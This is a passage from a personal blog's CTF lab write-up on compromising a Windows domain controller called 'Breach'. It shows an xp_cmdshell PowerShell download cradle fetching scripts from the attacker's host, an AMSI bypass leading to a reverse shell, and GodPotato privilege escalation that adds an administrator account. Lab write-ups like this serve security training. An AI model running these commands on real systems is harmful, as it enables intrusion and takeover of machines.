INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (BREACH\Administrator  dbo@master)&gt; </span><br></pre></td></tr></table></figure>
<p>Now we can run a commands. After enabling xp_cmdshell we run the following with our listener up:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL (BREACH\Administrator  dbo@master)&gt; xp_cmdshell echo IEX((New-Object Net.WebClient).DownloadString(&quot;http://10.8.4.29/a2.ps1&quot;)) | powershell -noprofile</span><br><span class="line">---</span><br><span class="line">$ sudo python3 -m http.server 80                 </span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.112.98 - - [28/Mar/2025 11:16:18] &quot;GET /a2.ps1 HTTP/1.1&quot; 200 -</span><br><span class="line">10.10.112.98 - - [28/Mar/2025 11:16:58] &quot;GET /cradle.ps1 HTTP/1.1&quot; 200 -</span><br><span class="line">10.10.112.98 - - [28/Mar/2025 11:16:59] &quot;GET /sm.ps1 HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
<ul>
<li><code>a2.ps1</code> is a AMSI-Bypass tha once finished will reach out again for the cradle.ps1</li>
<li><code>cradle.ps1</code> will reach out again for the reverse shell.</li>
<li><code>sm.ps1</code> is the full reverse shell. Nishang Oneliner.</li>
</ul>
<p><img src="/img/crowd.gif"><br>This get us a reverse shell. Finally!!</p>
<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ rlwrap nc -lvnp 9002                                                                           </span><br><span class="line">listening on [any]9002 ...</span><br><span class="line">connect to [10.8.4.29] from (UNKNOWN) [10.10.112.98]58767</span><br><span class="line">PS C:\Windows\system32&gt; cd \programdata</span><br><span class="line">PS C:\programdata&gt; ls</span><br></pre></td></tr></table></figure>
<p>After looking at our privileges we can see our easy out.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br></pre></td></tr></table></figure>
<p>Transfered GodPotato over and created a user and added them to the Administrators group.<br><img src="/img/potato.gif"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PS C:\programdata&gt; .\GP.exe -cmd &quot;cmd /c net user das Password123! /add &amp;&amp; net localgroup Administrators das /add&quot;</span><br><span class="line">[*] CombaseModule: 0x140728437833728</span><br><span class="line">[*] DispatchTable: 0x140728440424312</span><br><span class="line">[*] UseProtseqFunction: 0x140728439716656</span><br><span class="line">[*] UseProtseqFunctionParamCount: 6</span><br><span class="line">[*] HookRPC</span><br><span class="line">[*] Start PipeServer</span><br><span class="line">[*] CreateNamedPipe \\.\pipe\3d715370-aea5-445c-99d8-44b10fe45380\pipe\epmapper</span><br><span class="line">[*] Trigger RPCSS</span><br><span class="line">[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046</span><br><span class="line">[*] DCOM obj IPID: 0000a002-020c-ffff-8d0d-32b15ac3e33c</span><br><span class="line">[*] DCOM obj OXID: 0x5accc6eeede9cc5</span><br><span class="line">[*] DCOM obj OID: 0x3ea5b1981acb83fd</span><br><span class="line">[*] DCOM obj Flags: 0x281</span><br><span class="line">[*] DCOM obj PublicRefs: 0x0</span><br><span class="line">[*] Marshal Object bytes len: 100</span><br><span class="line">[*] UnMarshal Object</span><br><span class="line">[*] Pipe Connected!</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">[*] CurrentsImpersonationLevel: Impersonation</span><br><span class="line">[*] Start Search System Token</span><br><span class="line">[*] PID : 104 Token:0x756  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation</span><br><span class="line">[*] Find System Token : True</span><br><span class="line">[*] UnmarshalObject: 0x80070776</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\SYSTEM</span><br><span class="line">[*] process start with pid 2084</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
<p>Lets get on the system.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i breach.vl -u das -p &#x27;Password123!&#x27;</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                                            </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\das\Documents&gt; whoami /all</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ntlm-theft/">ntlm theft</a><a class="post-meta__tags" href="/tags/kerberoasting-SPNs/">kerberoasting SPNs</a><a class="post-meta__tags" href="/tags/silver-ticket/">silver ticket</a><a class="post-meta__tags" href="/tags/mssql/">mssql</a><a class="post-meta__tags" href="/tags/amsi-bypass/">amsi-bypass</a></div><div class="post-share"><div class="social-share" data-image="/img/breach.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/01/Scrambled/" title="Scrambled (Windows Medium)"><img class="cover" src="/img/scrambled.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Scrambled (Windows Medium)</div></div><div class="info-2"><div class="info-item-1">Scrambled is a Medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user ksimpson. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the Public share with the credentials of ksimpson, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account SqlSvc has a Service Principal Name (SPN) associated with it. An attacker can use this information to perform an attack that is knows as kerberoasting and get the hash of SqlSvc. After cracking the hash and acquiring the credentials for the SqlSvc account an attacker can perform a silver ticket attack to forge a ticket and impersonate the user Administrator on the remote MSSQL service. Enumeration...</div></div></div></a><a class="pagination-related" href="/2025/03/14/Cypher/" title="Cypher (Linux Medium)"><img class="cover" src="/img/cypher.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Cypher (Linux Medium)</div></div><div class="info-2"><div class="info-item-1">Cypher is a Linux Medium box that starts with a website hosting a .jar file. Once downloaded and decompiled you find amongst them a CustomFunctions.class java file. Using jd-gui we are able to look at the source code of the file. The code reveals a attack vector inside a string that executes a system command. Using Cypher Injection we are able to obtain a reverse shell that gets us on the box as neo4j. Once on the box we look around to find a .yml file containing credentials. Trying with the other user gets us a shell as graphasm. We ssh in for stability, and check what permissions we have with sudo -l that reveals we can run bbot with sudo. Looking into the github and the man pages. We can force run a config through a dry run and have it abort before executing. Doing this we can obtain the root.txt file.  Initial Nmap12345678910111213PORT   STATE SERVICE REASON         VERSION22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)|...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">An aspiring hacker and a CTF player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #E2E6E6;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #007aff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fa-solid fa-cube" style="color: #2dfc04;"></i></a><a class="social-icon" href="https://www.instagram.com/junkie_mayhem/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #833AB4;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I like to put things here for safe keeping 🔐🔐</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Initial Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB"><span class="toc-number">2.</span> <span class="toc-text">SMB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Theft"><span class="toc-number">2.1.</span> <span class="toc-text">NTLM Theft</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">3.</span> <span class="toc-text">Kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Silver-Ticket-Attack"><span class="toc-number">3.1.</span> <span class="toc-text">Silver Ticket Attack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">4.</span> <span class="toc-text">PrivEsc</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="H4CK,TH3,PL4N3T" data-fontsize="21px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Where do you want to go?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>